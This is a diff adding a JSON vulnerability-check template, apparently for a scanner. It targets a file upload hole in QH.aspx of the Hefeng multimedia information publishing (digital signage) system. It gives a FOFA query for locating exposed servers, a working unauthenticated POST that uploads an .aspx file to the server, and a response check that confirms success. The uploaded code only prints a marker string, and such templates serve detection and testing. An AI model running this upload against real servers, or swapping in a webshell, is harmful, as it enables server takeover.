@@ -1,0 +1,49 @@
+{
+  "product": "和丰多媒体信息发布系统",
+  "vul_name": "和丰多媒体信息发布系统 QH.aspx文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "和丰多媒体信息发布系统 存在文件上传漏洞,恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。\n\n",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"和丰山海-数字标牌\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s/IMYK0-3_sCZcCXYMatMH9g",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/QH.aspx",
+      "file": {
+        "fileToUpload": [
+          "52e039302a62d077.aspx",
+          "<% response.write(\"95cc64dd2825f9df13ec4ad683ecf339\") %>",
+          "application/octet-stream"
+        ]
+      },
+      "data": {
+        "action": "upload",
+        "responderId": "ResourceNewResponder",
+        "remotePath": "/opt/resources"
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "52e039302a62d077.aspx"
+        }
+      ]
+    }
+  }
+}
